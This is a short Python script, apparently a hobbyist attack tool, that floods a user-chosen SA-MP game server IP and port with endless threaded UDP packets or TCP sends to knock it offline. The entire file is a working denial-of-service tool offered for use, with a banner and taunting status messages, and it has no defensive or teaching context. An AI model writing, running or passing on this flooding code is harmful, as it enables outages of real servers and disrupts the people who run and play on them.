#Author : ZieL
import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[96m\n
██╗  ██╗███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
╚██╗██╔╝████╗  ██║██║   ██║╚██╗██╔╝██╔════╝██╔══██╗
 ╚███╔╝ ██╔██╗ ██║██║   ██║ ╚███╔╝ █████╗  ██████╔╝
 ██╔██╗ ██║╚██╗██║██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗
██╔╝ ██╗██║ ╚████║╚██████╔╝██╔╝ ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[96m\n""")

print("TOOLS FOR UDP SA-MP SERVER")

ip = str(input("➣IP : "))
port = int(input("➣PORT : "))
choice = str(input("➣ARE YOU READY (y/n) : "))
times = int(input("➣CONNECTIONS : "))
threads = int(input("➣THREADS : "))

os.system("clear")
def run():
	data = random._urandom(2000)
	i = random.choice(("[+]","[-]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XNUXER NIH DECK")
		except:
			print("[>] SERVER HAS BEEN MT")

def run2():
	data = random._urandom(16)
	i = random.choice(("[+]","[-]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XNUXER NIH DECK!!!")
		except:
			s.close()
			print("[>] AMFUN SAYANK")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
